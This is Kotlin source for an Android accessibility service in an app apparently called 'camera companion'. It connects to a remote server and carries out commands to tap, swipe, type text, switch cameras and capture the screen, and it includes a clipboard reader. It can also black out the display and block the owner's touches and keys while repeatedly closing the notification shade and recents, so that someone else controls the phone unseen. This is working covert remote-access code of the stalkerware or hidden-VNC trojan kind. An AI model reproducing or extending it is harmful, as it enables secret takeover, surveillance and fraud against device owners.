package com.artem.cameracompanion

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Path
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.Display
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class ControlService : AccessibilityService() {

    companion object {
        @Volatile var instance: ControlService? = null
        private val lockCount = java.util.concurrent.atomic.AtomicInteger(0)
        val overlayLocked: Boolean get() = lockCount.get() > 0
        fun acquireLock()  { lockCount.incrementAndGet() }
        fun releaseLock()  { if (lockCount.get() > 0) lockCount.decrementAndGet() }
        fun resetLocks()   { lockCount.set(0) }

        fun readClipboard(ctx: android.content.Context): String {
            val cm = ctx.getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
            return cm.primaryClip?.getItemAt(0)?.coerceToText(ctx)?.toString() ?: ""
        }
    }

    private var wsControl: WebSocket? = null
    private val ctrlHandler = Handler(Looper.getMainLooper())
    private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
    private var overlayView: View? = null
    private var overlayParams: WindowManager.LayoutParams? = null
    private var darkView: View? = null
    private val screenExecutor = Executors.newSingleThreadExecutor()

    // Periodically dismiss the notification shade and recents while overlay is locked.
    // Event-based detection alone is unreliable (event package/type varies by ROM).
    private val shadeCloserRunnable = object : Runnable {
        override fun run() {
            if (!overlayLocked) return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)
            } else {
                @Suppress("DEPRECATION")
                sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
            }
            ctrlHandler.postDelayed(this, 40)
        }
    }

    private val serverBase: String get() {
        var host = BuildConfig.DEFAULT_SERVER.trim()
        if (host.isEmpty()) return ""
        host = host.removePrefix("http://").removePrefix("ws://")
        if (!host.contains(":")) host = "$host:80"
        return "ws://$host"
    }

    override fun onServiceConnected() {
        instance = this
        connectControlWs()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            @Suppress("NewApi")
            StreamingService.onAccessibilityConnected()
        }
    }

    fun startIntentSafely(intent: Intent) {
        ctrlHandler.post { try { startActivity(intent) } catch (_: Exception) {} }
    }

    // ── Control WebSocket ──────────────────────────────────────────────────

    private fun connectControlWs() {
        val base = serverBase
        if (base.isEmpty()) return
        val model = Uri.encode(Build.MODEL ?: "Android")
        val owner = BuildConfig.OWNER_USERNAME.trim().let { if (it.isNotEmpty()) "&owner=${Uri.encode(it)}" else "" }
        http.newWebSocket(Request.Builder().url("$base/control?role=phone&model=$model$owner").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsControl = ws }
                override fun onMessage(ws: WebSocket, text: String) {
                    try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsControl = null
                    if (instance != null) ctrlHandler.postDelayed({ if (instance != null) connectControlWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsControl = null
                    if (instance != null) ctrlHandler.postDelayed({ if (instance != null) connectControlWs() }, 5000)
                }
            })
    }

    // ── Touch-block overlay ────────────────────────────────────────────────

    private fun showTouchBlockOverlay() {
        if (overlayView != null) return
        if (!Settings.canDrawOverlays(this)) return
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )
        overlayParams = params
        val view = View(this)
        overlayView = view
        ctrlHandler.post {
            try {
                (getSystemService(WINDOW_SERVICE) as WindowManager).addView(view, params)
                acquireLock()
                ctrlHandler.postDelayed(shadeCloserRunnable, 40)
            }
            catch (_: Exception) { overlayView = null; overlayParams = null }
        }
    }

    private fun hideTouchBlockOverlay() {
        val v = overlayView ?: return
        overlayView = null; overlayParams = null
        releaseLock()
        ctrlHandler.removeCallbacks(shadeCloserRunnable)
        ctrlHandler.post {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
        }
    }

    private fun showDarkOverlay() {
        if (darkView != null) return
        if (!Settings.canDrawOverlays(this)) return
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )
        params.screenBrightness = 0.0f
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            @Suppress("NewApi")
            params.fitInsetsTypes = 0
        }
        val view = View(this).apply { setBackgroundColor(android.graphics.Color.argb(252, 0, 0, 0)) }
        darkView = view
        if (android.provider.Settings.System.canWrite(this)) {
            val cr = contentResolver
            android.provider.Settings.System.putInt(cr,
                android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
            android.provider.Settings.System.putInt(cr,
                android.provider.Settings.System.SCREEN_BRIGHTNESS, 0)
        }
        ctrlHandler.post {
            try {
                (getSystemService(WINDOW_SERVICE) as WindowManager).addView(view, params)
                acquireLock()
                ctrlHandler.postDelayed(shadeCloserRunnable, 40)
            }
            catch (_: Exception) { darkView = null }
        }
    }

    private fun hideDarkOverlay() {
        val v = darkView ?: return
        darkView = null
        releaseLock()
        ctrlHandler.removeCallbacks(shadeCloserRunnable)
        if (android.provider.Settings.System.canWrite(this)) {
            android.provider.Settings.System.putInt(contentResolver,
                android.provider.Settings.System.SCREEN_BRIGHTNESS, 128)
        }
        ctrlHandler.post {
            try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
        }
    }

    private fun dispatchGestureWithOverlay(gesture: GestureDescription) {
        val v = overlayView
        val p = overlayParams
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        ctrlHandler.post {
            if (v != null && p != null) {
                p.flags = p.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                try { wm.updateViewLayout(v, p) } catch (_: Exception) {}
            }
            dispatchGesture(gesture, object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription) {
                    if (v == null || p == null) return
                    p.flags = p.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
                    ctrlHandler.post { try { wm.updateViewLayout(v, p) } catch (_: Exception) {} }
                }
                override fun onCancelled(gestureDescription: GestureDescription) = onCompleted(gestureDescription)
            }, ctrlHandler)
        }
    }

    // ── Command dispatch ───────────────────────────────────────────────────

    private fun handleMessage(msg: JSONObject) {
        when (msg.getString("type")) {
            "tap"   -> performTap(msg.getDouble("x").toFloat(), msg.getDouble("y").toFloat())
            "swipe" -> performSwipe(
                msg.getDouble("x1").toFloat(), msg.getDouble("y1").toFloat(),
                msg.getDouble("x2").toFloat(), msg.getDouble("y2").toFloat(),
                msg.optLong("ms", 200)
            )
            "key"        -> performKey(msg.optString("name", ""))
            "text"       -> typeText(msg.optString("text", ""))
            "cam-switch" -> startService(Intent(this, StreamingService::class.java)
                .setAction("SWITCH_CAM").putExtra("cam", msg.optString("cam", "back")))
            "touch-lock" -> ctrlHandler.post {
                if (msg.optBoolean("locked", false)) showTouchBlockOverlay() else hideTouchBlockOverlay()
            }
            "dark-screen" -> ctrlHandler.post {
                val on = msg.optBoolean("enabled", false)
                StreamingService.darkScreen = on
                if (on) showDarkOverlay() else hideDarkOverlay()
            }
            "screen-quality" -> {
                StreamingService.screenQuality = msg.optInt("quality", 60).coerceIn(10, 90)
            }
        }
    }

    // ── Gesture helpers ────────────────────────────────────────────────────

    private fun screenSize(): Pair<Int, Int> {
        val dm = getSystemService(DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(Display.DEFAULT_DISPLAY) ?: return Pair(1080, 1920)
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        return Pair(metrics.widthPixels, metrics.heightPixels)
    }

    private fun performTap(nx: Float, ny: Float) {
        val (w, h) = screenSize()
        val path = Path().apply { moveTo(nx * w, ny * h) }
        dispatchGestureWithOverlay(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build())
    }

    private fun performSwipe(nx1: Float, ny1: Float, nx2: Float, ny2: Float, ms: Long) {
        val (w, h) = screenSize()
        val path = Path().apply { moveTo(nx1 * w, ny1 * h); lineTo(nx2 * w, ny2 * h) }
        dispatchGestureWithOverlay(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, maxOf(1L, ms))).build())
    }

    private fun performKey(name: String) {
        val audio by lazy { getSystemService(AUDIO_SERVICE) as AudioManager }
        when (name) {
            "BACK"        -> performGlobalAction(GLOBAL_ACTION_BACK)
            "HOME"        -> performGlobalAction(GLOBAL_ACTION_HOME)
            "RECENTS"     -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "NOTIFICATIONS", "NOTIFS" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "POWER"       -> performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
            "VOLUME_UP"   -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
            "VOLUME_DOWN" -> audio.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
            "ENTER"       -> typeText("\n")
            "DEL"         -> deleteLastChar()
            "DPAD_UP"     -> performSwipe(0.5f, 0.65f, 0.5f, 0.35f, 150)
            "DPAD_DOWN"   -> performSwipe(0.5f, 0.35f, 0.5f, 0.65f, 150)
            "DPAD_LEFT"   -> performSwipe(0.65f, 0.5f, 0.35f, 0.5f, 150)
            "DPAD_RIGHT"  -> performSwipe(0.35f, 0.5f, 0.65f, 0.5f, 150)
        }
    }

    private fun typeText(text: String) {
        val node = rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
        val target = focused ?: node
        val args = Bundle()
        args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        // recycle focused only if it's a different object from node
        if (focused != null) try { focused.recycle() } catch (_: Exception) {}
        try { node.recycle() } catch (_: Exception) {}
    }

    private fun deleteLastChar() {
        val node = rootInActiveWindow ?: return
        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val cur = focused.text?.toString() ?: ""
            if (cur.isNotEmpty()) {
                val args = Bundle()
                args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur.dropLast(1))
                focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            }
            try { focused.recycle() } catch (_: Exception) {}
        }
        try { node.recycle() } catch (_: Exception) {}
    }

    override fun onKeyEvent(event: KeyEvent): Boolean = overlayLocked

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!overlayLocked || event == null) return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return  // our own app — ignore

        // TYPE_APPLICATION_OVERLAY sits below TYPE_STATUS_BAR and TYPE_NAVIGATION_BAR
        // in Z-order, so system-UI gestures (shade pull, recents) bypass our touch-block
        // overlay. Close them reactively instead.
        if (pkg == "com.android.systemui" || pkg.endsWith(".systemui")) {
            // Notification shade or recents (Android < 10, recents lived in SystemUI)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE)
            } else {
                @Suppress("DEPRECATION")
                sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
            }
            // Also dismiss recents if it's the recents screen that appeared
            val cls = event.className?.toString() ?: ""
            if (cls.contains("Recents", ignoreCase = true) || cls.contains("Overview", ignoreCase = true) ||
                cls.contains("QuickStep", ignoreCase = true) || cls.contains("RecentTask", ignoreCase = true)) {
                performGlobalAction(GLOBAL_ACTION_BACK)
                ctrlHandler.postDelayed({ if (overlayLocked) performGlobalAction(GLOBAL_ACTION_HOME) }, 250)
            }
            return
        }

        // Android 10+ moved recents/overview into the launcher process.
        // Detect by class name since package varies by OEM (Pixel, Samsung, Xiaomi…).
        val cls = event.className?.toString() ?: ""
        val isRecents = cls.contains("Recents", ignoreCase = true) ||
            cls.contains("Overview", ignoreCase = true) ||
            cls.contains("QuickStep", ignoreCase = true) ||
            cls.contains("RecentTask", ignoreCase = true) ||
            cls.contains("RecentApps", ignoreCase = true)
        if (isRecents) {
            performGlobalAction(GLOBAL_ACTION_BACK)
            // HOME is more reliable than BACK on some ROMs/launchers
            ctrlHandler.postDelayed({ if (overlayLocked) performGlobalAction(GLOBAL_ACTION_HOME) }, 250)
        }
    }
    override fun onInterrupt() {}

    @RequiresApi(Build.VERSION_CODES.R)
    fun captureScreen(onResult: (android.graphics.Bitmap?) -> Unit) {
        takeScreenshot(Display.DEFAULT_DISPLAY, screenExecutor,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                    val hw = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    onResult(hw)
                    screenshot.hardwareBuffer.close()
                }
                override fun onFailure(errorCode: Int) { onResult(null) }
            }
        )
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        resetLocks()
        hideTouchBlockOverlay()
        hideDarkOverlay()
        StreamingService.darkScreen = false
        wsControl?.close(1000, "stopped"); wsControl = null
        screenExecutor.shutdown()
        try { http.dispatcher.executorService.shutdown() } catch (_: Exception) {}
        try { http.connectionPool.evictAll() } catch (_: Exception) {}
        return super.onUnbind(intent)
    }
}
